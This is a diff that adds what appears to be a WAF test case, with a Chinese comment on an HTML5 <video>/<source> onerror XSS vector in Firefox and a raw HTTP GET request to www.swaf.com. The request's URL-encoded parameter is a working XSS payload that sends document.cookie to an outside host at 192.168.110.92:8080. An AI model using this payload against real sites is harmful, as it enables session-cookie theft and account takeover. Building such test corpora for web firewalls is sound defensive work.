@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_video-06506779
+# 通过 <VIDEO> 和 <SOURCE> 标签执行 JavaScript，当与 <SOURCE> 标签一起应用时，Firefox 3.5+ 允许在 <VIDEO> 标签中使用错误处理事件onerror。<AUDIO> 标签也是如此。在 Firefox 4+ 上，<SOURCE> 标签与触发错误事件无关。当页面在 URL 中有一个数字符号 (#) 时，会发生这种情况，因为 <VIDEO> 标记中的隐含“src”属性。
+GET /?id=%3Cvideo%20onerror=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E%3Csource%3E%3C%2Fsource%3E%3C%2Fvideo%3E&bid=hd_tag_m8mv25bq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25bq
+RM-PRO-Token: 166a7ccc6ae8778d2d39489888d4941f
+RM-PRO-Time: 1742808458052
+User-Agent: curl/7.83.1
+
